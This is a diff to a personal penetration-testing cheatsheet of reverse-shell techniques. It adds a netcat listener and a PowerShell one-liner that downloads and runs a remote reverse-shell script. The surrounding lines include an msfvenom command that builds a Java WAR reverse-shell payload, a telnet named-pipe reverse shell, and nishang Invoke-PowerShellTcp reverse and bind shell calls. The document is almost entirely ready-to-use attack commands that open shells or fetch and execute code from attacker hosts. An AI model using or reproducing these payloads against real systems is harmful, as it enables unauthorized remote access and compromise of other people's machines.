@@ -4,7 +4,16 @@ https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
 
 ## INITIAL ENTRY 
+
+Random notes
 -e x86/shikata_ga_nai
+
+This adds up/down/left/right functionality!
+```
+rlwrap nc -lvp [PORT]
+```
+
+
 ````
 JSP / tomcat WAR 
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war > java4444.war  
@@ -73,8 +82,14 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 nishang
 /opt/windows/nishang/Shells/
 Invoke-PowerShellTcp.ps1 
+
+Add these to the bottom of script
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 Invoke-PowerShellTcp -Bind -Port 4444
+
+then download
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.20/reverse.ps1')
+
 
 python /opt/windows/mkpsrevshell.py                            
 USAGE: mkpsrevshell.py IP PORT
